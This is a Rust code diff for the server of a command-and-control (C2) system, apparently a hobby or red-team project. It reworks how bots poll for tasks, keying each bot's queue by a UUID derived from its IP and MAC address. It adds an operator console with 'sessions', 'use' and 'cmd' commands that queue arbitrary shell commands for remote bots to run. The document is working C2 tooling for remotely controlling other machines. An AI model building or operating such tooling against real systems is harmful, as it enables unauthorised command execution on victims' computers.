@@ -33,7 +33,7 @@ async fn handle_task_result(task_result: ProtoBuf<c2::TaskResult>) -> Result<Htt
             println!("got execute res: {:?}", execute_res);
         }
         _ => {
-            unimplemented!();
+            // unimplemented!();
         }
     };
     HttpResponse::Ok().protobuf(c2::Empty::default())
@@ -61,61 +61,34 @@ async fn handle_poll(
     broker: Data<Arc<Mutex<Event>>>,
     // broker: Data<Event>,
 ) -> Result<HttpResponse, Error> {
-    println!("got handle poll");
+    // println!("got handle poll");
     let mut res_task: Option<c2::Task> = None;
-
-    // let broker = broker.clone();
-    // let mut event = broker.lock().await;
-    // match broker.try_lock() {
-    //     Some(event) _+
-    // } ;
+    let id = utils::gen_uuid(&bot_id.ip, &bot_id.mac);
+    // println!("got poll from id:{:?}", id);
     if let Some(mut event) = broker.try_lock() {
+        // event
         let task_map = &mut event.task_map;
-        let task_deque = task_map.get_mut("client0").unwrap();
+        let task_deque = task_map.entry(id).or_insert(VecDeque::new());
+        // let task_deque = task_map.get_mut("client0").unwrap();
         let task = (task_deque).pop_front();
         match task {
             Some(tk) => {
                 res_task = Some(tk);
             }
             None => {
-                println!("== no task for poll");
+                // println!("== no task for poll");
             }
         };
     } else {
         println!("broker lock failed");
     }
-    // let event =  broker.try_next();
-    // let event =
-    // match event {
-    //     Ok(Some(ev)) => {
-    //         let mut task_map = ev.clone().task_map;
-    //         let task_deque = task_map.get_mut("client0").unwrap();
-    //         let task = (*task_deque).pop_front();
-    //         match task {
-    //             Some(tk) => {
-    //                 res_task = Some(tk);
-    //             },
-    //             None => {
-    //                 println!("== no task for poll");
-    //             }
-    //         }
-    //     },
-    //     _ => {
-    //         println!("no event for poll");
-    //     }
-    // };
-
-    // let mut res_task: Option<c2::Task> = None;
-
-    let id = utils::gen_uuid(&bot_id.ip, &bot_id.mac);
-    println!("got poll from id:{:?}", id);
-
     if res_task.is_none() {
         let mut res = c2::Task::default();
         let data = c2::task::Data::Execute(ExecuteReq {
             cmd: "whoami".to_string(),
         });
-        res.data = Some(data);
+        // res.data = Some(data);
+        res.data = None;
 
         res_task = Some(res);
     }
@@ -138,23 +111,57 @@ async fn handle_cli(mut broker: Arc<Mutex<Event>>) -> Result<(), Error> {
     // let tasks: VecDeque<c2::Task> = VecDeque::new();
     // self.task_map.insert("client0".to_string(), tasks);
     // let mut event = broker.lock().await;
+    let mut prompt = ">> ".to_string();
+    let mut current_session: Option<String> = None;
     loop {
-        let readline = rl.readline(">> ");
+        if current_session.is_some() {
+            prompt = format!("({}) >> ", current_session.clone().unwrap());
+        }
+        let readline = rl.readline(&prompt);
         match readline {
             Ok(line) => {
                 if line.is_empty() {
                     continue;
                 }
+                // sessions
+                // sessions client0
+                // cmd ls -al
 
+                let line_split = line.split_ascii_whitespace();
+                let parts = line_split.map(|x| x.to_string()).collect::<Vec<String>>();
                 // let event1 = event.clone();
                 let mut event = broker.lock().await;
-                let mut task_map = &mut event.task_map;
+                let task_map = &mut event.task_map;
                 // let task_deque = task_map.get_mut("client0").unwrap();
-                let task = c2::Task {
-                    data: Some(c2::task::Data::Execute(ExecuteReq { cmd: line.clone() })),
-                };
-                if let Some(td) = task_map.get_mut("client0") {
-                    (*td).push_back(task);
+                if &line == "sessions" {
+                    let keys = task_map.keys().collect::<Vec<&String>>();
+                    dbg!(keys);
+                    continue;
+                }
+
+                // sessions client0
+                if current_session.is_none()
+                    && parts.len() == 2
+                    && parts[0] == "use"
+                    && task_map.get(&parts[1]).is_some()
+                {
+                    current_session = Some(parts[1].clone());
+                    println!("[*] use session: {}", &parts[1]);
+                    continue;
+                }
+
+                if current_session.is_some() && parts.len() > 1 && parts[0] == "cmd" {
+                    let task = c2::Task {
+                        data: Some(c2::task::Data::Execute(ExecuteReq {
+                            cmd: parts[1..].join(" "),
+                        })),
+                    };
+                    if let Some(td) = task_map.get_mut(&current_session.clone().unwrap()) {
+                        (*td).push_back(task);
+                        println!("[*] add task success");
+                    } else {
+                        println!("[*] current session not in task_map");
+                    }
                 }
 
                 // broker.send(event.clone()).await.unwrap();
